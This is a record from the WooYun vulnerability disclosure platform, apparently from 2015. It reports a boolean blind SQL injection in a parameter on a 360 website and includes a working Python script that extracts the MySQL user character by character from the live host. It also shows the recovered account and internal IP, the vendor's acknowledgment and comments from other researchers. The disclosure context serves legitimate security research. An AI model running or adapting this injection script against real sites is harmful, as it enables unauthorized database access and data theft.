{"id": 73964, "wybug_id": "wooyun-2015-0165470", "wybug_title": "360某站点MySQL注射(附验证脚本)", "wybug_corp": "奇虎360", "wybug_author": "lijiejie", "wybug_date": "2015-12-28 16:53", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： 360某站点MySQL注射(附验证脚本) 详细说明：  \nhttp://channel.360.cn/frontnotice/list?list_id=1\nlist_id可注入,MySQL bool blind.    漏洞证明：  猜解user()，得到\n[Done]MySQL user is antifraud@10.172.183.158\n\n\npython脚本：\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {}payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')print 'Start to retrive MySQL User:'user = ''for i in range(1,25):    for payload in payloads:        conn = httplib.HTTPConnection('channel.360.cn', timeout=60)        s = \"/frontnotice/list?list_id=1 and ascii(mid(user(),%s,1))=%s\" % (i, ord(payload))        conn.request(method='GET',                     url=s,                     headers=headers)        html_doc = conn.getresponse().read().decode('utf-8')        conn.close()        if html_doc.find(u'违规渠道封包功能上线') > 0:            user += payload            print '\\n[Scan in progress]' + user            break        else:            print '.',print '\\n[Done]MySQL user is ' + user\n   修复方案：  类型转换/过滤/转义   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-12-28 17:22 厂商回复： 感谢白帽子反馈，相关同事已第一时间响应跟进处理，预祝白帽子同学们新年快乐。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-28 16:56 |    \t\t狗狗侠  \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:58        | 我是狗狗侠)\t\t \n  啪啪啪。。。好666    \n     2015-12-28 17:02 |    \t\t毛猴 \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:36        | 一 只 怀 有 梦 想 的 猴 ......)\t\t \n  干的漂亮！    \n     2015-12-28 17:13 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:7        | 带我玩)\t\t \n  啪啪啪。。。好666     \n     2015-12-28 17:13 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1023 漏洞数:235        | 1.乌云最帅的男人                        ...)\t\t \n  大牛    \n     2015-12-28 17:30 |    \t\tphantom0307 \t\t\t( 普通白帽子  |\t\t\t        Rank:123 漏洞数:36        | Night time sharpensHeightens each sens...)\t\t \n  关注，等公开~    \n     2015-12-28 17:42 |    \t\t沦沦 \t\t\t( 普通白帽子  |\t\t\t        Rank:611 漏洞数:141        | 爱老婆，爱生活)\t\t \n  666666    \n     2015-12-28 18:21 |    \t\tstilwel_song \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:7        | huc)\t\t \n  大神啊  NB    \n     2016-01-03 02:42 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1656 漏洞数:246        | WooYun is the Bigest gay place.  网络工...)\t\t \n  李姐姐又在测神器。    \n     2016-01-11 18:15 |    \t\tCan \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:21        | 我个人认为Windows环境下明小子最好用！)\t\t \n  2333rank 卧槽 好6    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}